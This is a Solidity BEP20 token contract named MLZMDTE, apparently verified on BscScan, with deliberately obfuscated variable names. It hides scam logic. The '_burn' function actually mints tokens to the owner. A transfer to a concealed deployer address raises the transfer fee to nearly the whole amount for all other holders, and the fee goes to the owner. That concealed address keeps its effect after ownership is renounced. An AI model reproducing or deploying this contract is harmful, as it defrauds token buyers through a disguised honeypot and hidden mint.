/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.7.2;
contract MLZMDTE {
address private  QDLZTW = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
string public  name = "MLZMDTE";
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant MWZGMV = 99999;
uint256 private  OOQHXL = 1000000000000000;
address private  IQELZP = address(0);
address private  ZIOTWI = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address private  KNQUDC = address(0);
string public  symbol = "MLZMDTE";
uint256 private  LRJTRT = 100000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  KZWCXP = 1000000000000000000;
uint256 private  OPOXJK = 10000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  QWMUAH = 10000000000000;
uint8 public constant decimals = 18;
uint256 private  OVUAJM = 1000000000000000000;
address private  WNVMCK = address(0);
uint256 private  CCMINE = 1000000000000000000000;
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tILMZHF 0");
require(spender != address(0), "fILMZHF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getIQELZP() private returns (address) {
return IQELZP;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () {
QDLZTW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getLRJTRT() private returns (uint256) {
return LRJTRT;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getOOQHXL() private returns (uint256) {
return OOQHXL;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getKNQUDC() private returns (address) {
return KNQUDC;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getWNVMCK() private returns (address) {
return WNVMCK;
}

function _getCCMINE() private returns (uint256) {
return CCMINE;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getZIOTWI() private returns (address) {
return ZIOTWI;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ILMZHF");
require(to != address(0), "ILMZHF");
require(amount <= balanceOf[from], "ILMZHF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* MWZGMV/KZWCXP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QDLZTW){
KZWCXP = MWZGMV+2;
}
emit Transfer(from, to, transferAmount);
}
function _getOVUAJM() private returns (uint256) {
return OVUAJM;
}

function _getOPOXJK() private returns (uint256) {
return OPOXJK;
}

function _getQWMUAH() private returns (uint256) {
return QWMUAH;
}


}